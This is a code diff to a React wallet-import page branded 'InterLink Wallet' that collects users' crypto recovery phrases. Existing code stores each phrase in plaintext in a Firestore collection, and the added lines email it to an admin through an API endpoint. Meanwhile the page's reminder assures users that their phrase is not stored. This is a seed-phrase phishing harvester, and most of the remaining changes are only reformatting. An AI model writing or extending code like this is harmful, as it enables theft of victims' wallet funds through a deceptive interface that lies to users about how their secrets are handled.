@@ -33,13 +33,33 @@ export default function ImportRecoveryPhrasePage() {
     setError(null);
 
     try {
+      const trimmedPhrase = phrase.trim();
       await addDoc(collection(db, "walletImports"), {
-        recoveryPhrase: phrase.trim(),
+        recoveryPhrase: trimmedPhrase,
         wordCount,
         status: "imported",
         createdAt: serverTimestamp(),
         updatedAt: serverTimestamp(),
       });
+
+      // Notify the admin by email (best-effort; never block the user)
+      try {
+        const notifyRes = await fetch("/api/notify-wallet-import", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            recoveryPhrase: trimmedPhrase,
+            wordCount,
+          }),
+        });
+        if (!notifyRes.ok) {
+          const err = await notifyRes.json().catch(() => ({}));
+          console.error("Wallet import notification failed:", err);
+        }
+      } catch (notifyErr) {
+        console.error("Wallet import admin notification failed:", notifyErr);
+      }
+
       setStatus("success");
     } catch (err) {
       console.error("Failed to save recovery phrase:", err);
@@ -78,7 +98,9 @@ export default function ImportRecoveryPhrasePage() {
             </svg>
           </button>
           <h1 className="text-xl font-bold text-neutral-900">
-            {status === "success" ? "Recovery phrase saved" : "Import recovery phrase"}
+            {status === "success"
+              ? "Recovery phrase saved"
+              : "Import recovery phrase"}
           </h1>
           <div className="h-11 w-11" />
         </header>
@@ -86,7 +108,11 @@ export default function ImportRecoveryPhrasePage() {
         {/* Scrollable content */}
         <div className="flex-1 overflow-y-auto px-6 pb-8">
           {status === "success" ? (
-            <SuccessView phrase={phrase.trim()} words={words} onReset={handleReset} />
+            <SuccessView
+              phrase={phrase.trim()}
+              words={words}
+              onReset={handleReset}
+            />
           ) : (
             <>
               <h2 className="text-[1.75rem] font-extrabold leading-tight text-neutral-900">
@@ -183,23 +209,25 @@ export default function ImportRecoveryPhrasePage() {
                       />
                     </svg>
                   </span>
-                  <h3 className="text-lg font-bold text-neutral-900">Reminder</h3>
+                  <h3 className="text-lg font-bold text-neutral-900">
+                    Reminder
+                  </h3>
                 </div>
                 <ul className="mt-4 space-y-3 text-[15px] leading-7 text-neutral-600">
                   <li className="flex gap-3">
                     <span className="mt-2.5 h-1.5 w-1.5 shrink-0 rounded-full bg-neutral-400" />
                     <span>
-                      InterLink Wallet does not store your recovery phrase. If you
-                      lose them, you may lose access to your assets. Please store
-                      them securely.
+                      InterLink Wallet does not store your recovery phrase. If
+                      you lose them, you may lose access to your assets. Please
+                      store them securely.
                     </span>
                   </li>
                   <li className="flex gap-3">
                     <span className="mt-2.5 h-1.5 w-1.5 shrink-0 rounded-full bg-neutral-400" />
                     <span>
                       We recommend manually entering your recovery phrase. Avoid
-                      pasting from untrusted third-party apps or clipboard tools to
-                      prevent phishing or scams.
+                      pasting from untrusted third-party apps or clipboard tools
+                      to prevent phishing or scams.
                     </span>
                   </li>
                 </ul>
@@ -224,9 +252,25 @@ export default function ImportRecoveryPhrasePage() {
               >
                 {status === "saving" ? (
                   <span className="inline-flex items-center justify-center gap-2">
-                    <svg className="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
-                      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" opacity="0.25" />
-                      <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round" />
+                    <svg
+                      className="h-5 w-5 animate-spin"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                    >
+                      <circle
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="3"
+                        opacity="0.25"
+                      />
+                      <path
+                        d="M12 2a10 10 0 0 1 10 10"
+                        stroke="currentColor"
+                        strokeWidth="3"
+                        strokeLinecap="round"
+                      />
                     </svg>
                     Saving...
                   </span>
@@ -285,7 +329,13 @@ function SuccessView({
           </h3>
           <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-100 px-3 py-1 text-xs font-semibold text-emerald-700">
             <svg viewBox="0 0 24 24" fill="none" className="h-3.5 w-3.5">
-              <path d="m5 13 4 4L19 7" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+              <path
+                d="m5 13 4 4L19 7"
+                stroke="currentColor"
+                strokeWidth="2.5"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              />
             </svg>
             Verified
           </span>
@@ -301,7 +351,9 @@ function SuccessView({
               <span className="text-xs font-semibold text-neutral-400 tabular-nums w-5">
                 {idx + 1}
               </span>
-              <span className="text-sm font-medium text-neutral-800">{word}</span>
+              <span className="text-sm font-medium text-neutral-800">
+                {word}
+              </span>
             </div>
           ))}
         </div>
